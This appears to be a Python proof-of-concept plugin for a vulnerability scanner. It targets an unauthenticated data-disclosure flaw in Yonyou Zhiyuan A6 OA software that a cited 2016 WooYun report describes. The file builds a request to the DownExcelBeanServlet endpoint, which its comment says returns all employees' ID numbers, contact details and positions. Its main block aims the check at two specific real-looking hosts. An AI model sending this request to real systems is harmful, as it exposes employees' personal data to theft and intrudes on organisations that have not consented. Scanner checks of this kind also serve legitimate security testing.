#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2016-0170297
#可以下载所有员工的个人信息，包括身份证、联系方式、职位等敏感信息。

import re

def assign(service, arg):
    if service == "yongyou_zhiyuan_a6":
        return True, arg    

def audit(arg):
    url = arg
    poc = url + "yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
    code, head, res, errcode, _ = curl.curl2(poc)
    if re.search('Content-disposition: attachment;filename=.*?.xls', head):
        security_warning(poc + '   Disclosure of sensitive information')

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_zhiyuan_a6', 'http://oa.juntongtongxin.com/')[1])
    audit(assign('yongyou_zhiyuan_a6', 'http://110.167.194.10:8081/')[1])